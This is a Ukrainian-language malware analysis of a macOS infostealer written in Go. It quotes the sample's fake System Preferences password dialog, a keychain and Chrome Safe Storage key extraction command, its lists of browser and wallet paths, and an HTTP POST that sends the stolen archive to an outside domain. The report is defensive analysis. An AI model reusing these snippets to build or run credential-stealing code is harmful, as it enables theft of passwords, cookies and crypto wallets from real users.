Аналіз зразка [НАЗВА] — macOS infostealer
#

TL;DR
#

Зразок є інфостілером для macOS, написаним мовою Go і зібраним як universal binary для Intel та Apple Silicon. Після запуску він отримує пароль користувача через підроблене вікно автентифікації, збирає облікові дані, криптогаманці, дані браузерів і документи в ZIP-архів у пам’яті, відправляє його HTTP POST-запитом на amos-malware[.]ru і завершується, показавши фейкове повідомлення про збій застосунку.

Цілями є системне сховище Keychain, п’ять десктопних криптогаманців (Electrum, Coinomi, Exodus, Atomic Wallet, Binance), 54 крипто-розширення браузерів, вісім браузерів (сім Chromium-збірок і Firefox) та файли з розширеннями .txt, .rtf, .key, .wallet, .private, .secret на робочому столі й у документах. Разом із паролем, здобутим на першому кроці, вкрадений архів дозволяє розшифрувати офлайн і контейнер Keychain, і бази паролів Chromium, і seed-фрази гаманців.

Зразок зібрано як universal binary з двома архітектурами, тому він виконується як на Intel-, так і на Apple Silicon-машинах без емуляції. Символи не обрізані, що дозволило відновити оригінальні імена функцій.

Ім’я My Go Application.app є значенням за замовчуванням, яке підставляють інструменти пакування Go-програм у бандл macOS. Тобто розробник не змінював його на щось правдоподібне, як це роблять зразки, що маскуються під конкретне легітимне ПЗ.

Functionality
#

Ініціалізація (main_init)
#

На самому початку в main_init ввідбувається ініціалізція цікавих змінних, це вже розкриває цілі зразка. Зразок націлений на …

 1// Розширення файлів для filegrabber
 2mw_filegrabber_exts = strings_Split(".txt,.rtf,.key,.wallet,.private,.secret", ",");
 3
 4// Вихідний ZIP формується в пам'яті (bytes.Buffer), а не на диску
 5main_buf    = runtime_newobject(&RTYPE_bytes_Buffer);
 6main_writer = archive_zip_NewWriter(&go_itab__ptr_bytes_Buffer_comma_io_Writer, main_buf);
 7
 8// Базові шляхи
 9main_user      = os_Getenv("USER");
10main_library   = "/Users/" + main_user + "/Library/Application Support/";
11main_desktop   = "/Users/" + main_user + "/Desktop/";
12main_documents = "/Users/" + main_user + "/Documents/";
13
14// Браузери
15main_firefox = main_library + "Firefox/Profiles/";
16main_chrome  = main_library + "Google/Chrome/";
17main_brave   = main_library + "BraveSoftware/Brave-Browser/";
18main_edge    = main_library + "Microsoft Edge/";
19main_vivaldi = main_library + "Vivaldi/";
20main_yandex  = main_library + "Yandex/YandexBrowser/";
21main_opera   = main_library + "com.operasoftware.Opera/";
22main_operagx = main_library + "com.operasoftware.OperaGX/";

26main_coinomi  = main_library + "Coinomi/wallets/";
27main_exodus   = main_library + "Exodus/";
28main_atomic   = main_library + "atomic/Local Storage/leveldb/";

Браузери. Покрито вісім браузерів: Firefox і сім Chromium-збірок. Це пояснює, навіщо зразок окремо дістає ключ Chrome Safe Storage — один ключ розшифровує бази всіх Chromium-браузерів, а не лише Chrome.

Криптогаманці. Electrum, Coinomi, Exodus, Atomic Wallet. Atomic адресується через Local Storage/leveldb, тобто забирається база розширення, а не файл гаманця напряму.

Filegrabber. Розширення .key, .private, .secret — це приватні ключі та seed-фрази; .wallet — файли гаманців; .txt і .rtf беруться з розрахунку на те, що користувачі часто зберігають паролі й seed-фрази у звичайних текстових файлах. Пошук обмежений каталогами Desktop і Documents.

Архів існує лише в пам’яті. archive_zip_NewWriter отримує *bytes.Buffer, а не файл. Вкрадені дані ніколи не записуються на диск проміжним файлом, що ускладнює виявлення за артефактами файлової системи.

Capabilities
#

1. Фішинг GUI вікном
#

Зразок на самому початку отримує пароль облікового запису macOS, показуючи користувачу підроблене вікно з запитом автентифікації. Спершу отримується ім’я користувача за допомогою os.Getenv("USER") і потім перевіряє, чи обліковий запис захищений паролем, за допомогою утиліти dscl:

1dscl /Local/Default -authonly <user> ""

Якщо пароль встановлено, показується фішингове вікно, яке маскується під System Preferences.

1display dialog "MacOS wants to access System Preferences
2%s
3Please enter your password." ¬
4    with title "System Preferences" ¬
5    with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:ToolbarAdvanced.icns" ¬
6    default answer "" ¬
7    giving up after 30 ¬
8    with hidden answer

Введений пароль перевіряється тим самим викликом dscl, тепер уже зі справжнім значенням. Якщо пароль не вірний - діалог показується знову. Готовий пароль записується в архів окремим файлом password-entered. Архів формується в пам’яті процесу, за допомогою archive/zip.NewWriter, який отримує bytes.Buffer, копіванням файлу займається функція main_write.

2. Викрадення сховища Keychain
#

Після отримання пароля зразок намагаєтсья викрасти Keychain. Фізично він зберігається у це файлі login.keychain-db у папці профілю користувача, зашифрований паролем облікового запису. Зразок копіює цей файл в архів під іменем login-keychain:

1  v2 = runtime_concatstring3(0, "/Users/", 7, main_user, *(&main_user + 1), "/Library/Keychains/login.keychain-db", 36);
2  return main_write(v2, v3, "login-keychain", 14);

Разом з паролем це дає повний доступ до його вмісту сховища: до паролів сайтів і застосунків, сертифікатів, токенів автентифікації etc.

На системах, де обліковий запис не має пароля, виконується інша гілка. Діалог там не показується, контейнер Keychain не копіюється, а замість цього зразок витягує з нього ключ Chrome Safe Storage. Це ключ, яким Chromium шифрує бази паролів і cookie. Результат зберігається в архів під шляхом Chromium/Chrome/Local State

1security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'

3. Викрадення даних криптогаманців
#

Після облікових даних зразок переходить до збору криптогаманців. Його цілю є: Electrum, Coinomi, Exodus, Atomic Wallet і Binance.

Для Electrum, Coinomi, Exodus, Atomic Walle забирається весь вміст каталогу. Зразок отримує ім’я кожного файлу і копіює його в архів під шляхом Wallets/<гаманець>/<файл>.

4. Викрадення даних браузерів
#

Зразок викрадає дані з Chrome, Brave, Edge, Vivaldi, Yandex, Opera і Opera GX та Firefox браузерів.

Chromium
#

Для кожного з Chromium браузерів виконується рекурсивний обхід його дерева каталогів за допомогою filepath.Walk() з сallback функцією main_GrabChrome_func1, яка шукає та копіює в архів інформацію про:

  • Cookies
  • Login Data зі збереженими логінами й паролями
  • Web Data з даними автозаповнення
  • Local Extension Settings каталог з даними про встановлені розширення

Знайшовши каталог Local Extension Settings з даними про розширення, зразок читає його вміст і звіряє ім’я кожного розширення зі заготовленим списком із 54 id крипто розширень і при зназодження копіює в архів для ексфільтрації

5. Збір файлів
#

Зразок шукає та копіює в архів файли з розширенням .txt, .rtf, .key, .wallet, .private, .secret з робочого столу та з каталогу документів.

1mw_filegrabber_exts = strings_Split(".txt,.rtf,.key,.wallet,.private,.secret", ",");

Пошук виконується по двом каталоги ~/Desktop/ і ~/Documents/. Файли з робочого столу потрапляють в архів під префіксом FileGrabber/, а з каталогу документів під FileGrabber/doc_.

6. Збір інформації про систему
#

Також зразок збирає дані про заражену машину. Виконується команда system_profiler SPHardwareDataType. Ця команда повертає дані про модель пристрою, ідентифікатор моделі, тип і кількість ядер процесора, обсяг пам’яті, серійний номер і апаратний UUID. Результат виконання команди пишеться в архів під іменем Sysinfo.txt:

7. Ексфільтрація зібраних даних
#

Після збору, дані кодуються в base64 та відправляються HTTP POST запитом на домен amos-malware.ru на ендпоінт sendlog.

1v26       = archive_zip__ptr_Writer_Close(main_writer);
2data      = bytes__ptr_Buffer_Bytes(main_buf);
3data_bs64 = encoding_base64__ptr_Encoding_EncodeToString(encoding_base64_URLEncoding, ...);
4//  ...[snip]...
5return net_http_PostForm("http://amos-malware.ru/sendlog", 30, &v22);

В запит вставляються три додаткових поля:

1runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "BuildID", 7);   // main_buildid
2runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "user", 4);      // main_userlog
3runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "B64", 3);       // archive in base64
4
5return net_http_PostForm("http://amos-malware.ru/sendlog", 30, &v22);

Поле B64 містить увесь архів з викраденими даними. Два інші поля заповнюються з глобальних змінних:

1_main_buildid   = "UNICEF"
2_main_userlog   = "Holocaust"

Після ексфільтрації користувачу показується фейкове повідомлення про збій застосунку. Користувач бачить звичайну помилку запуску й не має підстав шукати сторонню активність. Робта зразка при цьому завершується

1display dialog "An unexpected error ocurred while running the Application"
2    with title "macOS Error"
3    with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:AlertStopIcon.icns"
